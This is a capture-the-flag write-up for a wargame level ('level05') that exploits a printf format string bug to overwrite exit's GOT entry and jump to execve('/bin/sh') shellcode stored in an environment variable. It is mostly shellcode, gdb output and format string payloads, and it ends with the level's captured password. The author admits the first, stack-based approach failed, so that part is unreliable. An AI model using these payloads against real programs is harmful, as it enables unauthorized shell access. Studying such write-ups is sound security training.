Ok, so the idea here is to do a format string attack, to override the `exit` address in the `GOT`,
thanks to the code below:
```c
printf(buff);
exit(0);
```

The main issue here is to exploit this while all characters are set in lowercase.

The new `exit` address in the `GOT` should point to our `shellcode` address
stored in the stack.

First of all, we need to get a shell code that can be contained in 96 characters:
```
\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
```

The uppercase letters are between `0x41` (65), and `0x5a` (90).
It's not possible as you can see we have `0x51` in the middle of the string.

If we [disassemble the shellcode](https://defuse.ca/online-x86-assembler.htm#disassembly2),
we have these instructions inside:
```
0:  31 c9                   xor    ecx,ecx
2:  f7 e1                   mul    ecx
4:  51                      push   ecx
5:  68 2f 2f 73 68          push   0x68732f2f
a:  68 2f 62 69 6e          push   0x6e69622f
f:  89 e3                   mov    ebx,esp
11: b0 0b                   mov    al,0xb
13: cd 80                   int    0x80
```

We need to change the `push ecx` to something else which is not between `0x41` to `0x5a`.


- What this code is doing exactly?
This code is on the first two lines setting `ecx`, `edx` and `eax` to 0.
The `mul` expression with one operand means that it'll makes a multiplication between 2 registers,
`rax` and the one specified. So here, `ecx`. Then, it'll store the highest bytes into `edx` register,
and the lowest ones into `rax`.
And because `ecx` is `0`, then `rax` and `rdx` will result into a `0` number.

Then, it'll prepare the argument for the syscall. The syscall is defined here:
```
f:  89 e3                   mov    ebx,esp
11: b0 0b                   mov    al,0xb
13: cd 80                   int    0x80
```

We first move the stack pointer into `ebx`, then `al` (= `eax` for only 8 bits) will contain 11,
to call the syscall with `int 0x80`.

All syscalls are listed on that website: https://syscalls.mebeim.net/?table=x86/32/ia32/latest
And from that, we can see that the syscall 11 is equal to `execve`.

This syscall takes 3 arguments:
- On `ebx` it'll take a `const char *filename`
- On `ecx` it'll take a `const char *const *argv`
- On `edx` it'll take a `const char *const *envp`

It'll help us to understand in a better way the shellcode:
```
4:  51                      push   ecx
5:  68 2f 2f 73 68          push   0x68732f2f
a:  68 2f 62 69 6e          push   0x6e69622f
```
These push aren't explicit arguments for the syscall. These are a string.

The push ecx is 0 on 4 bytes, so : "\0\0\0\0"
The push `0x68732f2f` is: `//sh` (in little endian)
The push `0x6e69622f` is `/bin` (in little endian)

All of these are here to avoid pushing a `0` value into
the stack that'll result Of the following instruction for example:
`68 2f 73 68 00`
1. `68` = push
2. `2f 73 68 00` = `/sh\0`
This could help us to remove the last push, and avoid sending an uppercase
character.

So we can now understand that the instruction:
```
f:  89 e3                   mov    ebx,esp
```
Is going to move the stack pointer into `ebx` that'll now points
to our string.
Thanks to that, the `execve` will receive the `/bin/sh`
as `filename` argument.

As we can see on the `man` page of `execve`:
`On  Linux,  argv  and envp can be specified as NULL.  In both cases, this has the same effect as specifying the argument as a pointer to a list containing a single null pointer.`

In other words, `ecx` and `edx` are null and it's normal, wanted and it'll work properly.

This will gave us the following shellcode:
`\x31\xC9\xF7\xE1\x68\x2F\x73\x68\x00\x68\x2F\x62\x69\x6E\x89\xE3\xB0\x0B\xCD\x80`

Find the buffer address:
```
(gdb) b *main + 188
Breakpoint 1 at 0x8048500
(gdb) r
Starting program: /home/users/level05/level05 
AAAAAAAABBBBBBBB 

Breakpoint 1, 0x08048500 in main ()
(gdb) print $esp+0x28
$1 = (void *) 0xffffd698
```

For the format string attack, we need to write first of all to the address:
`0x080497e0`

The address:
`0xffffd698` -> 4.294.956.696 characters

So we'll split it in two:
1. Write `0xd698` (54936) in `0x080497e0` (because of little-endian)
2. Write `0xffff` (65535) in `0x080497e2`

So at most 65.535 characters.

Offset 10:
```sh
level05@OverRide:~$ ./level05 
AAAA%x %x %x %x %x %x %x %x %x %x %x %x %x 
aaaa64 f7fcfac0 f7ec3af9 ffffd6df ffffd6de 0 ffffffff ffffd764 f7fdb000 61616161 25207825 78252078 20782520
```

Payload:
```py
print "\xe0\x97\x04\x08\xe2\x97\x04\x08%" + str(54936 - 8) + "x%10$hn%" + str(65535 - 54936 - 8) + "x%11$hn"
```
So, the payload has 34 characters.

But, we prefer to have aligned addresses, so we need to up to a full payload
of 36 characters to be aligned on 4.

We just need to ajust the address written by 36 to set the start of the shellcode:
```py
print "\xe0\x97\x04\x08\xe2\x97\x04\x08%54964x%10$hn%10571x%11$hn\x00\x00"
```

And then, add the shellcode just after it, and fill the complete buffer with `NOP` code:
```py
print "\xe0\x97\x04\x08\xe2\x97\x04\x08%51044x%10$hn%14483x%11$hn\x00\x00\x31\xC9\xF7\xE1\x68\x2F\x73\x68\x00\x68\x2F\x62\x69\x6E\x89\xE3\xB0\x0B\xCD\x80" + "\x90" * (100 - 56)
```

But anyway, I cant make it works, so forgot that, let's do another simpler way:

### Solution 2 - Use environment variables

We can simply bypass the lowercase enforce of chars by putting our shellcode into the environment variables / argv.
These are simply allocated space on the stack, so we can use them properly.

We can get the environment variable address with that:

```
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) set env PAYLOAD="AAAABBBBCCCCDDDD"
(gdb) b *main + 200
Breakpoint 1 at 0x804850c
(gdb) x/12xw $ebp
0xffffd718:	0x00000000	0xf7e45513	0x00000001	0xffffd7b4  ; [0] - [return_address] - [argc] - [argv]
0xffffd728:	0xffffd7bc	0xf7fd3000	0x00000000	0xffffd71c  ; [envp]
0xffffd738:	0xffffd7bc	0x00000000	0x08048230	0xf7fceff4
(gdb) x/20xw 0xffffd7bc
0xffffd7bc:	0xffffd8ef	0xffffd8ff	0xffffd913	0xffffd932
0xffffd7cc:	0xffffd945	0xffffd952	0xffffde73	0xffffdec0
0xffffd7dc:	0xffffded7	0xffffdee6	0xffffdefe	0xffffdf0f
0xffffd7ec:	0xffffdf28	0xffffdf30	0xffffdf42	0xffffdf52
0xffffd7fc:	0xffffdf7f	0xffffdf9f	0xffffdfba	0x00000000  ; Our env should be on this line
(gdb) x/s 0xffffdfba
0xffffdfba:	 "LESSCLOSE=/usr/bin/lesspipe %s %s"
(gdb) x/s 0xffffdf9f
0xffffdf9f:	 "PAYLOAD=\"AAAABBBBCCCCDDDD\""
```

So let's write our payload:

- First of all, we need to write the adress of our payload which will be:
  - `0xffffdf9f` + 9 (So `PAYLOAD="`) = `0xffffdfa8`
  - This adress will be wroten in two parts: `0xffff` and `0xdfa8`
- We need to write the first one in the adress `0x80497e2`, and the second one in `0x80497e0`.
  - We'll write first the address `\xe0\x97\x04\x08`
  - Then the second address`\xe2\x97\x04\x08`
- To write: `0xdfa8`, we need to send: `%57248x` (so `0xdfa8 - 8 (2*4)`) to `printf`
- So to write: `0xffff`, we need to send: `%8279x` to `printf`
- And to write those values on the stack, we'll use `%10$n` and `%11$n` with the addresses positions on the stack.

So our exploit will be:
`\xe0\x97\x04\x08\xe2\x97\x04\x08%57248x%10$n%8279x%11$n`

```sh
level05@OverRide:~$ export PAYLOAD=$(python -c 'print("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")')
level05@OverRide:~$ python -c 'print("\xe0\x97\x04\x08\xe2\x97\x04\x08%57248x%10$n%8279x%11$n")' > /tmp/exploit
level05@OverRide:~$ cat /tmp/exploit - | ./level05
```

Password: `h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq`